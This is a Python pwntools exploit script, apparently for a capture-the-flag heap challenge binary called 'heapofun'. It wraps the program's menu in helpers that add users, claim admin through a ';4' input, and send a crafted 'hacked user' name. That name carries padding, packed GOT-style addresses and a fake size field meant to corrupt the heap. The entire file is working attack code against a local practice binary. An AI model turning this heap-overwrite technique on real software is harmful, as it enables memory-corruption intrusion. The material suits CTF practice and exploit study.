#!/usr/bin/python

from pwn import *
import os
import subprocess
import sys
import re

row = ord('A')
col = ord('0')
seat = chr(row)+chr(col)


f = open('payload.txt', 'w')

conn = process('./heapofun')

def do(inst):
	conn.sendline(inst)
	f.write(inst + '\n')


def getAdmin():
	do('2')
	conn.recvuntil('>')
	do('Admin')
	conn.recvuntil('>')
	do(';4')

def addUser(name='J'*98):
	do('2')
	conn.recvuntil('>')
	do(name)
	conn.recvuntil('>')
	do(seat)

def hackedUser():
	do('8')
	print conn.recvuntil('>')
	do('HackerAAAAAAAAAA')
	print conn.recvuntil('>')
	do(seat)
	print conn.recvuntil('>')

	newName = "K"*4*6 # padding
	newName += p32(0x0804b024) 
	newName += p32(0x0804b014) 
	newName += p32(0x25252525) # size XD
	newName += p32(0x50) # hopefuly points to some J's


	do(newName)

def inc_seat(my_row, my_col):
	my_col += 1
	if my_col >= ord('6'):
		my_col = ord('0')
		my_row += 1
	my_seat = chr(my_row)+chr(my_col)
	return (my_seat, my_row, my_col)



while 1:

	hacker_seat = ""
	menu = conn.recvuntil('>')
	menu = menu[:-1]
	menu += ' A. Get admin\n' 
	menu += ' B. Add user\n' 
	menu += ' C. Add hacked user\n' 
	menu += ' D. Load save file\n' 
	menu += ' E. Add hacker\n>' 
	print '#' + menu,

	option = raw_input()
	if option == 'A':
		getAdmin()
	elif option[0] == 'B':
		addUser()	
		seat, row, col = inc_seat(row, col)

	elif option[0] == 'E':
		addUser('HackerAAAAAAAAAA')	
		seat, row, col = inc_seat(row, col)

	elif option == 'C':

		hackedUser()
		seat, row, col = inc_seat(row, col)

	elif option == 'D':
		with open('./save.txt', 'r') as payload:
			for inst in payload:
				inst = inst.rstrip()
				do(inst)
				print conn.recvuntil('>')
		do('3')
	else:

		do(option)
		line = conn.recvuntil('>')
		while not re.search('Choose an option:', line):
			print line + 'lol',
			option = raw_input()
			do(option)
			line = conn.recvuntil('>')
		index = line.find('Choose')
		line = line[:index]
		for l in line.splitlines():
			if 'Booking by' in l:
				inbracket = False
				for c in l:
					if c == '[':
						inbracket = True
						sys.stdout.write(c)
					elif c == ']':
						inbracket = False
						sys.stdout.write(c)
					else:
						if inbracket:
							sys.stdout.write(hex(ord(c)))
						else:
							sys.stdout.write(c)

						

			print 'A' + l + 'B'
		#now it's the menu
		#don't print it jsut do nothing
		do('3') #prints a pun
		conn.recvuntil('\n') #drop the pun





